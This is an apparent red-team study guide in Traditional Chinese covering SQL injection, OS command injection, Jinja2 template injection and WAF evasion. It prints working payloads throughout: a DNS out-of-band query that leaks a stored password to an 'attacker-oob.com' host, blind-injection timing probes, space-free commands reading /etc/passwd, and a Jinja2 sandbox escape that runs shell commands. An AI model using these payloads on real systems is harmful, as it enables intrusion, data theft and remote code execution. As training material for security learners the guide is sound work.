# 💉 直譯器與語法樹注入深度學習路徑 (SQLi, Command Injection, SSTI)
> 對應紅隊作戰矩陣：**Phase 2 (R10)** (R10.1 ~ R10.3)  
> 預計總投入時間：**30 ~ 35 小時**（視資料庫 SQL、OS Shell 與模板引擎語法基礎而定）

---

## 📍 你在哪裡、去哪裡

```
你現在的狀態                         這份路徑帶你到達的位置
──────────────────                   ────────────────────────────
依賴 sqlmap 自動化工具跑注入 ──►     精通 AST 抽象語法樹結構破壞與手動構造盲注 Payload
命令注入遇到空白就卡死       ──►     精通環境變數混淆、IFS 與萬用字元無字元 RCE
模板注入只會測 {{7*7}}       ──►     精通 Python MRO 類別繼承鏈遍歷與沙盒逃逸 RCE
```

---

## 🧱 第零關：先確認你有這些基礎

| 概念 | 需要了解到的程度 | 快速補充資源 |
|------|-----------------|-------------|
| SQL 關聯查詢與語法樹 (AST) | 理解 Lexer/Parser 詞法語法分析與 SQL 解釋器原理 | [SQLite 官方語法解析器文檔](https://www.sqlite.org/draft/tokenreq.html) |
| Linux/Windows Shell 語義 | 理解管道符 `|`, 重定向 `>`, 子命令替換 `$(...)` 與環境變數 | [Bash Reference Manual](https://www.gnu.org/software/bash/manual/) |
| 物件導向與原型/繼承鏈 | 理解 Python `__mro__` / `__subclasses__()` 與 JavaScript 原型鏈 | [Python Data Model](https://docs.python.org/3/reference/datamodel.html) |

---

## 🗺️ 整體學習地圖（五個階段）

```
階段一 ──────► 階段二 ──────► 階段三 ──────► 階段四 ──────► 階段五
SQL語法樹破壞  盲注與外帶     OS命令直譯突破  SSTI模板沙盒逃逸 WAF編碼繞過
(8h)           (6h)           (8h)           (8h)           (5h)
```

---

## 🏛️ 階段一：SQL 查詢語法樹破壞與注入利用（約 8 小時）

### 1.1 AST (抽象語法樹) 的物理破壞本質
SQL 注入的本質並非單純字串拼接，而是**利用未過濾的字元閉合原有資料節點，注入新的「運算子 (Operator)」或「邏輯子節點」，使得直譯器將使用者輸入當作程式碼執行**。
- **UNION-based 注入**：要求欄位數量與型別 100% 嚴格對齊：
  ```sql
  ' UNION SELECT 1, table_name, 3 FROM information_schema.tables WHERE table_schema=database()-- -
  ```

---

## ⏱️ 階段二：布林與時間盲注以及 DNS 外帶 (OOB)（約 6 小時）

### 2.1 時間盲注與外帶技巧
當頁面完全無回顯且無報錯時，使用條件分支結合 `pg_sleep()` / `WAITFOR DELAY` 進行逐字元萃取：
```sql
# PostgreSQL 時間盲注驗證資料庫使用者第一位字元
'; SELECT CASE WHEN (ASCII(SUBSTRING(user,1,1))=112) THEN pg_sleep(5) ELSE pg_sleep(0) END--
```

### 2.2 DNS 帶外 (Out-of-Band) 高速提取
利用資料庫伺服器發起 DNS 查詢（如 MSSQL `xp_dirtree` 或 MySQL `LOAD_FILE()`）：
```sql
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 1), '.attacker-oob.com\\a'));
```

---

## ⚡ 階段三：作業系統命令直譯器注入突破 (Command Injection)（約 8 小時）

### 3.1 限制字元條件下的繞過藝術
當 WAF 嚴格過濾空白字元、斜線 `/` 或特定關鍵字時：
- **空白替代**：`${IFS}`、`$IFS$9`、`{cat,/etc/passwd}`、`bash<<<id`。
- **字串拼接混淆**：
  ```bash
  # 利用引號或變數拼接繞過關鍵字檢測
  w'h'o'a'm'i
  $u /etc/passwd  # 其中 $u 被定義為 cat
  ```
- **萬用字元匹配**：
  ```bash
  # 免直接出現字母執行 /bin/cat /etc/passwd
  /???/?[a-z] /???/p*d
  ```

---

## 🧪 階段四：伺服器端模板引擎表示式注入 (SSTI)（約 8 小時）

### 4.1 Python Jinja2 沙盒逃逸與 MRO 繼承鏈
當使用者輸入被帶入 `render_template_string()` 時觸發：
```python
# 1. 識別注入點並回顯
{{ 7 * 7 }}  # 回顯 49

# 2. 獲取 object 基類
{{ ''.__class__.__mro__[1] }}

# 3. 遍歷全系統子類別並調用 subprocess.Popen 或 os._wrap_close
{{ ''.__class__.__mro__[1].__subclasses__()[133]('id',shell=True,stdout=-1).communicate()[0] }}
```

---

## 🥷 階段五：WAF 編碼規避與藍隊防護繞過（約 5 小時）

### 5.1 語法異構與編碼混淆表
- **URL 雙重編碼**：`%2527` 繞過單層解碼代理。
- **註解字元插入**：`UN/**/ION/**/SEL/**/ECT` 破壞 WAF 正規表達式特徵比對。
- **JSON / Unicode 逃逸**：`\u0027` 在 JSON API 中被後端正確解析為單引號。

---

## ✅ 本路徑通過檢查表（Checklist）

- [ ] 能清楚說明 SQL 語法解析器 (Parser) 在遇見注入時語法樹的結構變化。
- [ ] 掌握不用任何空白字元在 Linux 終端執行任意命令的技巧。
- [ ] 能獨立構造 Python Jinja2 與 PHP Twig 的 SSTI 沙盒逃逸 Payload。
- [ ] 能使用 OOB DNS 解決無回顯盲注環境的資料快速萃取。
- [ ] 掌握至少 4 種規避傳統 WAF 靜態特徵碼的編碼變形策略。
